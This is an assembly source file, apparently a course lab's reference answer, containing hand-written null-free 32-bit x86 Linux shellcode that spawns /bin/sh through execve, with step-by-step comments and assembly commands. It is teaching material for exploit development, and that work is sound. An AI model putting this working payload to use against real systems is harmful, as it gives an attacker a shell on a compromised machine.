# shellcode.s -- hand-written execve("/bin/sh", NULL, NULL) for 32-bit x86 Linux.
#
# This is the reference answer for Problem 5 ("write your own shellcode"), the
# lecture's stated homework (slide 25: "Writing a shellcode for spawning
# /bin/sh is your homework"). No shellcraft.sh() -- every byte is written by
# hand.
#
# The classic 25-byte, null-free technique:
#   1. eax = 0                          (also our NULL terminator / argv end)
#   2. push "/bin//sh\0" onto the stack (two extra '/' keeps it 8 bytes, and
#      the kernel treats "//" as "/"), then ebx -> that string
#   3. argv = { ebx, NULL }             (push NULL, push ebx, ecx = esp)
#   4. edx = 0                          (envp = NULL)
#   5. eax = 0xb (SYS_execve), int 0x80
#
# Null-free matters for string-copy bugs (strcpy/gets stop at a 0x00); read()
# here is binary-safe, but writing null-free shellcode is the habit to build.
#
# Assemble the historic way (lecture slide 25) to inspect the bytes:
#   gcc -m32 -c solution3/shellcode.s -o /tmp/sc.o
#   objdump -d -M intel /tmp/sc.o
# The lab's solve_vuln4.py instead assembles this file with pwntools asm().

.intel_syntax noprefix
.global _start
_start:
    xor eax, eax            # eax = 0
    push eax                # string terminator: "...\0"
    push 0x68732f2f         # "//sh"  (little-endian: 2f 2f 73 68)
    push 0x6e69622f         # "/bin"  (little-endian: 2f 62 69 6e)
    mov  ebx, esp           # ebx -> "/bin//sh\0"
    push eax                # argv[1] = NULL
    push ebx                # argv[0] = ebx
    mov  ecx, esp           # ecx -> argv
    xor  edx, edx           # edx = envp = NULL
    mov  al, 0xb            # eax = 11 = SYS_execve
    int  0x80               # syscall
